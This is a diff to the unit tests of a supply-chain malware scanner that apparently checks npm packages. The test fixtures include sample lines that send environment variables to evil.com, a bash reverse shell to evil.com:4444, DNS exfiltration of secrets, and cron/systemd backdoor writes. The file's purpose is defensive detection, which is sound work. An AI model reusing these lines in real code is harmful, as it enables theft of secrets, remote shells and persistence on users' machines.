@@ -3,36 +3,69 @@ import { supplyChainChecks } from '../../src/checks/supply-chain/index.js';
 import { testLine, testFileCheck } from '../helpers.js';
 
 // ---------------------------------------------------------------------------
-// SC001 - Bulk Environment Variable Access
+// SC001 - Bulk Environment Variable Access with Network Call (FileCheck)
 // ---------------------------------------------------------------------------
 
-describe('SC001 - Bulk Environment Variable Access', () => {
-  it('detects Object.keys(process.env)', () => {
-    const finding = testLine(supplyChainChecks, 'SC001', 'Object.keys(process.env)');
-    expect(finding).not.toBeNull();
-    expect(finding!.checkId).toBe('SC001');
-    expect(finding!.severity).toBe('high');
-    expect(finding!.category).toBe('supply-chain');
+describe('SC001 - Bulk Environment Variable Access with Network Call', () => {
+  it('detects Object.keys(process.env) with fetch in same file', async () => {
+    const content = [
+      'const envVars = Object.keys(process.env);',
+      'fetch("https://evil.com", { body: JSON.stringify(envVars) });',
+    ].join('\n');
+    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
+      relativePath: 'node_modules/evil-pkg/index.js',
+      extension: 'js',
+      basename: 'index.js',
+    });
+    expect(findings.length).toBe(1);
+    expect(findings[0].checkId).toBe('SC001');
+    expect(findings[0].severity).toBe('critical');
+    expect(findings[0].category).toBe('supply-chain');
   });
 
-  it('detects Object.entries(process.env)', () => {
-    const finding = testLine(supplyChainChecks, 'SC001', 'const envVars = Object.entries(process.env)');
-    expect(finding).not.toBeNull();
+  it('detects Object.entries(process.env) with axios', async () => {
+    const content = [
+      'const envVars = Object.entries(process.env);',
+      'axios.post("https://evil.com", envVars);',
+    ].join('\n');
+    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
+      relativePath: 'node_modules/evil-pkg/exfil.js',
+      extension: 'js',
+      basename: 'exfil.js',
+    });
+    expect(findings.length).toBe(1);
   });
 
-  it('detects os.environ.items() in Python', () => {
-    const finding = testLine(supplyChainChecks, 'SC001', 'for k, v in os.environ.items():', 'py');
-    expect(finding).not.toBeNull();
+  it('does not flag bulk env without network call', async () => {
+    const content = 'const envVars = Object.keys(process.env);\nconsole.log(envVars);';
+    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
+      relativePath: 'node_modules/some-pkg/index.js',
+      extension: 'js',
+      basename: 'index.js',
+    });
+    expect(findings).toHaveLength(0);
   });
 
-  it('does not flag single process.env.NODE_ENV access', () => {
-    const finding = testLine(supplyChainChecks, 'SC001', 'const env = process.env.NODE_ENV');
-    expect(finding).toBeNull();
+  it('does not flag single process.env.NODE_ENV access', async () => {
+    const content = 'const env = process.env.NODE_ENV;\nfetch("https://api.com");';
+    const findings = await testFileCheck(supplyChainChecks, 'SC001', content, {
+      relativePath: 'node_modules/some-pkg/index.js',
+      extension: 'js',
+      basename: 'index.js',
+    });
+    expect(findings).toHaveLength(0);
   });
 
-  it('does not flag commented-out code', () => {
-    const finding = testLine(supplyChainChecks, 'SC001', '// Object.keys(process.env)');
-    expect(finding).toBeNull();
+  it('does not flag minified bundles', async () => {
+    // Minified: >2000 char line — many modules bundled together
+    const longLine = 'var a=' + 'Object.keys(process.env)'.padEnd(500, ';var b=1') +
+      ';fetch("https://api.com")' + ';var c=2'.repeat(200);
+    const findings = await testFileCheck(supplyChainChecks, 'SC001', longLine, {
+      relativePath: 'node_modules/some-pkg/dist/bundle.js',
+      extension: 'js',
+      basename: 'bundle.js',
+    });
+    expect(findings).toHaveLength(0);
   });
 });
 
@@ -40,12 +73,12 @@ describe('SC001 - Bulk Environment Variable Access', () => {
 // SC002 - HTTP Exfiltration of Secrets
 // ---------------------------------------------------------------------------
 
-describe('SC002 - HTTP Exfiltration of Secrets', () => {
-  it('detects fetch sending env data', () => {
+describe('SC002 - HTTP POST with Secrets', () => {
+  it('detects .post() with process.env', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC002',
-      'fetch(url, { body: JSON.stringify(process.env) })',
+      'axios.post(url, { data: process.env })',
     );
     expect(finding).not.toBeNull();
     expect(finding!.checkId).toBe('SC002');
@@ -53,23 +86,32 @@ describe('SC002 - HTTP Exfiltration of Secrets', () => {
     expect(finding!.category).toBe('supply-chain');
   });
 
-  it('detects axios sending token', () => {
+  it('detects http.request with credential', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC002',
-      'axios(exfilUrl, { data: { token: secret } })',
+      'http.request(url, { body: credential })',
     );
     expect(finding).not.toBeNull();
   });
 
-  it('detects requests.post with env in Python', () => {
+  it('detects requests.post with os.environ in Python', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC002',
-      'requests.post(url, data={"env": os.environ})',
+      'requests.post(url, data=os.environ)',
       'py',
     );
     expect(finding).not.toBeNull();
+  });
+
+  it('does not flag .get() calls', () => {
+    const finding = testLine(
+      supplyChainChecks,
+      'SC002',
+      'axios.get(url + process.env.API_URL)',
+    );
+    expect(finding).toBeNull();
   });
 });
 
@@ -149,24 +191,27 @@ describe('SC004 - Base64 Decoded Execution', () => {
 // ---------------------------------------------------------------------------
 
 describe('SC005 - Obfuscated Code', () => {
-  it('detects long hex escape sequences', () => {
+  it('detects 21+ hex escape sequences', () => {
+    // 22 hex pairs mixed with real code — not a pure data table
+    const hexPairs = Array.from({ length: 22 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
     const finding = testLine(
       supplyChainChecks,
       'SC005',
-      'var a = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21"',
+      `var payload = "${hexPairs}"; sendData(payload); doOtherStuff(); morePaddingHere();`,
     );
     expect(finding).not.toBeNull();
     expect(finding!.checkId).toBe('SC005');
     expect(finding!.severity).toBe('high');
   });
 
-  it('detects long unicode escape sequences', () => {
+  it('does not flag 15 hex pairs (below threshold)', () => {
+    const hexPairs = Array.from({ length: 15 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
     const finding = testLine(
       supplyChainChecks,
       'SC005',
-      'var a = "\\u0068\\u0065\\u006c\\u006c\\u006f\\u0077"',
+      `var a = "${hexPairs}"`,
     );
-    expect(finding).not.toBeNull();
+    expect(finding).toBeNull();
   });
 
   it('does not flag short hex sequences', () => {
@@ -177,6 +222,18 @@ describe('SC005 - Obfuscated Code', () => {
     );
     expect(finding).toBeNull();
   });
+
+  it('does not flag data-heavy lines (unicode tables)', () => {
+    // Pure hex data — >80% hex content indicates a lookup table, not obfuscation
+    const hexPairs = Array.from({ length: 25 }, (_, i) => `\\x${(0x41 + (i % 26)).toString(16)}`).join('');
+    const finding = testLine(
+      supplyChainChecks,
+      'SC005',
+      `"${hexPairs}"`,
+      'js',
+    );
+    expect(finding).toBeNull();
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -184,24 +241,33 @@ describe('SC005 - Obfuscated Code', () => {
 // ---------------------------------------------------------------------------
 
 describe('SC006 - Reverse Shell Pattern', () => {
-  it('detects shell with socket', () => {
+  it('detects /bin/bash with socket', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC006',
-      'child_process.exec("/bin/bash -c socket connect")',
+      'child_process.exec("/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1", { socket: true })',
     );
     expect(finding).not.toBeNull();
     expect(finding!.checkId).toBe('SC006');
     expect(finding!.severity).toBe('critical');
   });
 
-  it('detects WebSocket to IP address', () => {
+  it('detects /bin/sh with net.connect', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC006',
-      "new WebSocket('ws://192.168.1.1:4444')",
+      'spawn("/bin/sh", ["-c", "nc"], { stdio: [net.connect(4444, "evil.com")] })',
     );
     expect(finding).not.toBeNull();
+  });
+
+  it('does not flag shell without network socket', () => {
+    const finding = testLine(
+      supplyChainChecks,
+      'SC006',
+      'child_process.exec("/bin/bash ./build.sh")',
+    );
+    expect(finding).toBeNull();
   });
 });
 
@@ -319,11 +385,11 @@ describe('SC008 - Install Script Network Fetch', () => {
 // ---------------------------------------------------------------------------
 
 describe('SC009 - DNS Exfiltration', () => {
-  it('detects dns.resolve with env data', () => {
+  it('detects dns.resolve with process.env data', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC009',
-      'dns.resolve(`${env}.evil.com`, callback)',
+      'dns.resolve(`${process.env.SECRET}.evil.com`, callback)',
     );
     expect(finding).not.toBeNull();
     expect(finding!.checkId).toBe('SC009');
@@ -338,6 +404,15 @@ describe('SC009 - DNS Exfiltration', () => {
     );
     expect(finding).not.toBeNull();
   });
+
+  it('detects dns.resolve with password', () => {
+    const finding = testLine(
+      supplyChainChecks,
+      'SC009',
+      'dns.resolve(`${password}.evil.com`)',
+    );
+    expect(finding).not.toBeNull();
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -345,7 +420,7 @@ describe('SC009 - DNS Exfiltration', () => {
 // ---------------------------------------------------------------------------
 
 describe('SC010 - System Persistence Mechanism', () => {
-  it('detects /etc/systemd path', () => {
+  it('detects writeFileSync to /etc/systemd', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC010',
@@ -357,30 +432,39 @@ describe('SC010 - System Persistence Mechanism', () => {
     expect(finding!.category).toBe('supply-chain');
   });
 
-  it('detects crontab reference', () => {
+  it('detects writeFile to /etc/cron', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC010',
-      'exec("crontab -l | { cat; echo \\"* * * * * /tmp/backdoor\\"; } | crontab -")',
+      'writeFile("/etc/cron.d/backdoor", "* * * * * /tmp/evil")',
     );
     expect(finding).not.toBeNull();
   });
 
-  it('detects ExecStart in shell script', () => {
+  it('detects open() with crontab - in Python', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC010',
-      'ExecStart=/usr/bin/node /opt/backdoor/server.js',
-      'sh',
+      'open("/etc/cron.d/miner", "w").write(crontab -payload)',
+      'py',
     );
     expect(finding).not.toBeNull();
+  });
+
+  it('does not flag .service without writeFile context', () => {
+    const finding = testLine(
+      supplyChainChecks,
+      'SC010',
+      'const svc = new Service({ name: "myapp.service" })',
+    );
+    expect(finding).toBeNull();
   });
 
   it('does not flag commented-out systemd reference', () => {
     const finding = testLine(
       supplyChainChecks,
       'SC010',
-      '// Writing to /etc/systemd is not recommended',
+      '// writeFileSync to /etc/systemd is not recommended',
     );
     expect(finding).toBeNull();
   });
